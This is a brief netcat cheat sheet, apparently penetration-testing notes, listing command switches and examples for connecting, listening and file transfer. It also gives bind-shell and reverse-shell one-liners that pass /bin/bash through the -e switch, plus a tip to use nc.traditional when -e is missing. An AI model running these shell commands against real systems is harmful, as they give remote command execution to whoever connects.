Netcat
https://en.wikipedia.org/wiki/Netcat

TCP/UDP networking tool


Switches

-n numeric only IPs, no DNS
-v verbose
-l listen
-p port
-e execute command


Examples

Connect to the given port on IP

nc -nv <IP> <port>

Listen on given port

nc -nvlp <port>

File transfer

On server open port and redirect data to file
nc -nvlp <port> > <file>

On client send file
nc -nv <IP> <port> < <file>

Bind shell

On server run
nc -nvlp <port> -e /bin/bash

On client run
nc -nv <IP> <port>

Reverse shell

On server run
nc -nvlp <port>

On client run
nc -nv <IP> <port> -e /bin/bash


Notes

Newer ncdoesn't have -eswitch. Try to use nc.traditional instead.
